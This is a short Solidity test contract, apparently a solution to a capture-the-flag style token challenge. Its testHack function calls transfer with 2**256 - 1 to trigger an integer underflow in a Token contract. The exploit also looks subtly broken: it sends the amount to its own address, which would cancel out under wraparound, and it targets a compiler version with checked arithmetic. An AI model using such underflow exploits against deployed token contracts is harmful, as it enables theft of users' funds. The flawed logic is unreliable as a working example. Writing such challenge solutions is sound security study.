// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Token.sol";

contract TokenHackTest {
    Token public tokenContract;

    constructor(address _tokenAddress) {
        tokenContract = Token(_tokenAddress);
    }

    function testHack() public {
        // Specify the amount of tokens to transfer
        uint amount = 2**256 - 1; 

        // Transfer a large amount of tokens to trigger underflow
        tokenContract.transfer(address(this), amount);
    }
}
